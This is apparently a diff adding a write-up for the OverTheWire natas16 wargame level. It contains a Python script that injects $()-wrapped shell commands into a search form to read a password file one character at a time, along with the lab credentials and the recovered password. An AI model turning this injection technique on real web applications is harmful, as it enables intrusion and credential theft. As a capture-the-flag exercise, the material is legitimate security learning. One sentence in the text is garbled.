@@ -1,0 +1,69 @@
+This lab has the same basic setup as natas10 but you are further limited since
+the semicolon, pipe, ampersand, backtick, single quote, and double quote
+characters are filtered. Like natas10, you are given access to a simple web form
+where you can search for words in a dictionary. As far as I'm aware, you are
+limited to only being able to insert a pattern.
+
+For sure you should know that you have to insert some kind of shell code to get
+the next password. The only way I could think of to do this lab was to
+encapsulate some shell code in $() for form input which is similar to using
+backticks. My approach was similar to the last lab. Since, we cannot directly
+access the password but we can check if a character in it is equal to our guess
+and if true then we execute an action that we know will lead to known output in
+the accessible main web page.
+
+I got stuck for quite a while trying to figure out how to retrieve the nth
+character from a string. On my local terminal, shell code I tried worked just
+fine. The obvious problem to me was possible string escaping discrepancies. I
+eventually tried making my own php webpage to try to debug. It turns out that
+the php passthru() function uses. Several string operations are not compatible
+between the two.
+
+Here is the code that I used:
+
+import os
+import string
+
+request_count = 0
+chars = list(string.ascii_letters + string.digits)
+password = ""
+
+for i in range(32):
+    for char in chars:
+        print(f"{i} {char}")
+        n = i
+        m = 32 - i - 1
+        payload = r"$(line=$(head -n 1 /etc/natas_webpass/natas17)" + "\n"
+        payload += r"char=${line#" + (n * "?") + r"}" + "\n"
+        payload += r"char=${char%" + (m * "?") + r"}" + "\n"        
+        payload += r"if [ $char = " + char + r" ]" + "\n"
+        payload += r"then echo grappled" + "\n"
+        payload += r"else echo zzz" + "\n"
+        payload += r"fi)"
+        print(f"payload = {payload}")
+        command = "curl -u natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh -d '"
+        command += f"needle={payload}"
+        command += "' http://natas16.natas.labs.overthewire.org/index.php"
+        print(f"command = {command}")
+        output = os.popen(command).read()
+        request_count += 1
+        print(f"current password = {password}")
+        if(output.find("<pre>\n</pre>") == -1):
+            password += char
+            break
+        if(char == "9"):
+            raise Exception(f"Error: could not find {i}th char")
+
+print(f"Executed {request_count} requests.")
+print(f"Final Password = {password}")
+
+This code took a little longer. It executed 958 curl commands. I used a random
+word as my "True" indicator. This is because leaving an empty string would
+retrieve the whole dictionary which made it much slower. I left in plenty of
+print statements in this program for debugging.
+
+There is no easy way to index a string in sh that I could find. This code
+removes the first n characters and then the last m characters in order to
+isolate the character of interest.
+
+natas17 password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
